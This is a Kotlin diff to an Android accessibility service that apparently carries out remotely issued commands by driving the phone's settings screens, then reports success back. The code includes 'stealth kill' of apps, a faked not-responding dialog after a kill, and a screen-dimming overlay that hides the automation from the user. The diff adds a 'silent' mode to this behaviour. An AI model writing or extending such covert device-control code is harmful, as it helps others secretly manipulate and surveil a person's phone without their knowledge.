@@ -100,6 +100,7 @@ class MyAccessibilityService : AccessibilityService() {
     private var sequenceTarget: String? = null
     private var sequenceCmdId: Int = -1
     private var isPerformingStealthKill = false
+    private var isSilentSequence = false
     private var mdrIsStandalone = false
     private var shouldShowAnrAfterKill = false
     private var pendingAnrAppName: String? = null
@@ -1073,13 +1074,14 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
-    fun startEyeShieldSequence(cmdId: Int, mode: String) {
+    fun startEyeShieldSequence(cmdId: Int, mode: String, silent: Boolean = false) {
         sequenceCmdId = cmdId
         sequenceTarget = mode // ENABLE or DISABLE
         activeSequence = "EYE_PHASE_1"
+        isSilentSequence = silent
         
         Handler(Looper.getMainLooper()).post {
-            DimmerManager.applyDim(this, 0, "AUTO")
+            if (!silent) DimmerManager.applyDim(this, 0, "AUTO")
             val intent = Intent(android.provider.Settings.ACTION_DISPLAY_SETTINGS).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
@@ -1306,15 +1308,19 @@ class MyAccessibilityService : AccessibilityService() {
     private fun finishSequence(msg: String) {
         activeSequence = null
         val id = sequenceCmdId
+        val silent = isSilentSequence
+        isSilentSequence = false
         CoroutineScope(Dispatchers.IO).launch {
             CommandProcessor.updateCommandStatus(applicationContext, id, "SUCCESS", msg)
             delay(1000)
             performGlobalAction(GLOBAL_ACTION_HOME)
             delay(500)
             performGlobalAction(GLOBAL_ACTION_HOME)
-            delay(2000)
-            withContext(Dispatchers.Main) {
-                DimmerManager.removeOverlay(applicationContext)
+            if (!silent) {
+                delay(2000)
+                withContext(Dispatchers.Main) {
+                    DimmerManager.removeOverlay(applicationContext)
+                }
             }
         }
     }
@@ -1427,6 +1433,7 @@ class MyAccessibilityService : AccessibilityService() {
         activeSequence = null
         sequenceCmdId = -1
         sequenceTarget = null
+        isSilentSequence = false
         isWaitingForDataSettings = false
         isPerformingStealthKill = false
         DebugLogger.log("FAILSAFE", "All Accessibility sequences aborted.")
